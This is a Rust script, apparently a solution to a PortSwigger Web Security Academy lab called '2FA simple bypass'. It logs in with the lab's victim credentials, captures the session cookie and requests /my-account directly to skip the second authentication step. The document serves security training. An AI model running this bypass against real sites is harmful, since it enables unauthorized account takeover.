/****************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 26/8/2023
*
* Lab: 2FA simple bypass
*
* Steps: 1. Login as carlos
*        2. Extract the session from the Set-Cookie header
*        3. Request /login2 using the extracted session
*        4. Request /my-account directly bypassing 2FA
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aa7007704f85c4e83f0191a00ec00ce.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // try to login as as carlos
    let login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", "montoya"),
        ]))
        .send();

    // if login succeeded
    if let Ok(res) = login {
        println!("{}", "1. Logged in as carlos.. OK".white().bold());

        // extract session from cookie header
        let session = extract_session_cookie(&res.headers());

        // try to GET /login2 page
        let login2 = client
            .get(format!("{url}/login2"))
            .header("Cookie", format!("session={session}"))
            .send();

        // if GET /login2 succeeded
        if let Ok(res2) = login2 {
            println!(
                "{}",
                "2. GET /login2 using extracted session.. OK".white().bold()
            );

            // try to bypass the 2FA by requsting /my-account directrly
            let home = client
                .get(format!("{url}/my-account?id=carlos"))
                .header("Cookie", format!("session={session}"))
                .send();

            // if bypass succeeded
            if let Ok(home_res) = home {
                println!(
                    "{}",
                    "3. GET /my-account directly bypassing 2FA.. OK"
                        .white()
                        .bold()
                );

                // search for name carlos in the body
                let body = home_res.text().unwrap();
                let carlos_name = extract_pattern("Your username is: (carlos)", &body);

                // check if the name exist
                if carlos_name.len() != 0 {
                    println!("{}", "✅ Logged in successfully as Carlos".green().bold());
                } else {
                    println!("{}", "Failed to login as Carlos".red().bold());
                }
            } else {
                println!("{}", "Couldn't get login2 page".red().bold());
            }
        } else {
            println!("{}", "Couldn't get login2 page".red().bold());
        }
    } else {
        println!("{}", "Login failed".red().bold());
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************************************
* Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
